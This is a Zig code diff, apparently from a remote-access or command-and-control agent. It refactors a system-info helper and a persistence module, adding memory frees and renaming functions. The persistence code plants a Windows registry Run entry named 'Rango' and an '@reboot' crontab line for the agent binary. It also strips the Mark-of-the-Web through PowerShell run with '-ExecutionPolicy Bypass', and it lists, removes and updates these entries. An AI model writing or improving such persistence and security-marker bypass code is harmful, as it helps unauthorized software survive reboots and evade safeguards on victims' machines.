@@ -100,13 +100,15 @@ pub const SystemInfo = struct {
                 std.debug.print("{}\n", .{err});
                 return try self.allocator.dupe(u8, "127.0.0.1");
             };
+            defer self.allocator.free(result.stdout);
+            defer self.allocator.free(result.stderr);
             var tokens = std.mem.splitAny(u8, result.stdout, "\n");
             const first_ip = tokens.first();
             while (tokens.next()) |line| {
-                if (std.mem.indexOf(u8, line, "IPv4 Address") != null) {
-                    const ip_start = std.mem.indexOf(u8, line, ":") orelse continue;
+                if (std.mem.find(u8, line, "IPv4 Address") != null) {
+                    const ip_start = std.mem.find(u8, line, ":") orelse continue;
                     const ip_str = std.mem.trim(u8, line[ip_start + 1 ..], " \t\r\n");
-                    if (ip_str.len > 0 and std.mem.indexOf(u8, ip_str, ".") != null) {
+                    if (ip_str.len > 0 and std.mem.find(u8, ip_str, ".") != null) {
                         return try self.allocator.dupe(u8, ip_str);
                     }
                 }
@@ -123,6 +125,8 @@ pub const SystemInfo = struct {
                 std.debug.print("{}\n", .{err}); //I should fix this later
                 return try self.allocator.dupe(u8, "127.0.0.1");
             };
+            defer self.allocator.free(result.stdout);
+            defer self.allocator.free(result.stderr);
             var tokens = std.mem.splitAny(u8, result.stdout, " ");
             const first_ip = tokens.first();
             if (first_ip.len == 0) {
@@ -244,7 +248,7 @@ pub const TimeUtils = struct {
 };
 
 pub const PersistUtils = struct {
-    pub fn install_cron(agent_path: []const u8, allocator: std.mem.Allocator, io: Io) !void {
+    pub fn installCron(agent_path: []const u8, allocator: std.mem.Allocator, io: Io) !void {
         if (builtin.os.tag == .windows) {
             const existing = try std.process.run(allocator, io, .{
                 .argv = &.{
@@ -256,8 +260,10 @@ pub const PersistUtils = struct {
                 },
             });
 
+            defer allocator.free(existing.stdout);
+            defer allocator.free(existing.stderr);
             const reg_exists = existing.term.exited == 0;
-            if (reg_exists and std.mem.indexOf(u8, existing.stdout, agent_path) != null) {
+            if (reg_exists and std.mem.find(u8, existing.stdout, agent_path) != null) {
                 return error.AlreadyPersistent;
             }
 
@@ -266,7 +272,8 @@ pub const PersistUtils = struct {
             const remove_motw = try std.process.run(allocator, io, .{
                 .argv = &.{ "powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", unblock_cmd },
             });
-
+            defer allocator.free(remove_motw.stdout);
+            defer allocator.free(remove_motw.stderr);
             if (remove_motw.term.exited != 0) {
                 return error.UnblockFileFailed;
             }
@@ -282,6 +289,8 @@ pub const PersistUtils = struct {
                     "/f",
                 },
             });
+            defer allocator.free(result.stdout);
+            defer allocator.free(result.stderr);
 
             if (result.term.exited != 0) {
                 return error.RegistryWriteFailed;
@@ -298,10 +307,12 @@ pub const PersistUtils = struct {
                 }
                 return err;
             };
+            defer allocator.free(existing.stdout);
+            defer allocator.free(existing.stderr);
             const cron_line = try std.fmt.allocPrint(allocator, "@reboot {s} &\n", .{agent_path});
             defer allocator.free(cron_line);
 
-            if (std.mem.indexOf(u8, existing.stdout, agent_path) != null) {
+            if (std.mem.find(u8, existing.stdout, agent_path) != null) {
                 return; // already persistent
             }
             const combined = try std.mem.concat(allocator, u8, &[_][]const u8{ existing.stdout, cron_line });
@@ -325,7 +336,7 @@ pub const PersistUtils = struct {
             //};
         }
     }
-    pub fn remove_cron_entry(agent_path: []const u8, allocator: std.mem.Allocator, io: Io) !void {
+    pub fn removeCronEntry(agent_path: []const u8, allocator: std.mem.Allocator, io: Io) !void {
         if (builtin.os.tag == .windows) {
             const existing = try std.process.run(allocator, io, .{
                 .argv = &.{ "reg.exe", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Rango", "/f" },
@@ -333,6 +344,8 @@ pub const PersistUtils = struct {
             if (existing.term.exited != 0) {
                 return error.RegistryDeleteFailed;
             }
+            defer allocator.free(existing.stdout);
+            defer allocator.free(existing.stderr);
         } else {
             const existing = std.process.run(allocator, io, .{
                 .argv = &.{ "crontab", "-l" },
@@ -342,13 +355,15 @@ pub const PersistUtils = struct {
                 if (err == error.ChildExecFailed) return; // nothing to remove no crontab
                 return err;
             };
+            defer allocator.free(existing.stdout);
+            defer allocator.free(existing.stderr);
             var list = std.ArrayList([]const u8).empty;
             defer list.deinit(allocator);
 
             // Split into lines and filter out any containing our agent path
             var it = std.mem.splitAny(u8, existing.stdout, "\n");
             while (it.next()) |line| {
-                if (std.mem.indexOf(u8, line, agent_path) == null and line.len > 0) {
+                if (std.mem.find(u8, line, agent_path) == null and line.len > 0) {
                     try list.append(allocator, line);
                 }
             }
@@ -370,7 +385,7 @@ pub const PersistUtils = struct {
         }
         //_ = write_proc.wait() catch {};//line caused a panic in my tests, commenting out for now
     }
-    pub fn get_cron_entries(allocator: std.mem.Allocator, io: Io) !?[]const u8 {
+    pub fn getCronEntries(allocator: std.mem.Allocator, io: Io) !?[]const u8 {
         if (builtin.os.tag == .windows) {
             const result = try std.process.run(allocator, io, .{
                 .argv = &.{
@@ -382,6 +397,9 @@ pub const PersistUtils = struct {
                 },
             });
 
+            defer allocator.free(result.stdout);
+            defer allocator.free(result.stderr);
+
             if (result.term.exited != 0) {
                 return try allocator.dupe(u8, "");
             }
@@ -392,6 +410,8 @@ pub const PersistUtils = struct {
                 .stdout_limit = .limited(8192),
                 .stderr_limit = .limited(8192),
             });
+            defer allocator.free(result.stdout);
+            defer allocator.free(result.stderr);
             const out = result.stdout;
             var filtered_lines = std.mem.tokenizeAny(u8, out, "\n");
             while (filtered_lines.next()) |line| {
@@ -400,15 +420,15 @@ pub const PersistUtils = struct {
                     _ = parts.next(); // skip "@reboot"
 
                     if (parts.next()) |path| {
-                        return path;
+                        return try allocator.dupe(u8, path);
                     }
                 }
             }
             return null; // No entry found
         }
     }
-    pub fn update_cron_entry(old_path: []const u8, new_path: []const u8, allocator: std.mem.Allocator, io: Io) !void {
-        try PersistUtils.remove_cron_entry(old_path, allocator, io);
-        try PersistUtils.install_cron(new_path, allocator, io);
+    pub fn updateCronEntry(old_path: []const u8, new_path: []const u8, allocator: std.mem.Allocator, io: Io) !void {
+        try PersistUtils.removeCronEntry(old_path, allocator, io);
+        try PersistUtils.installCron(new_path, allocator, io);
     }
 };
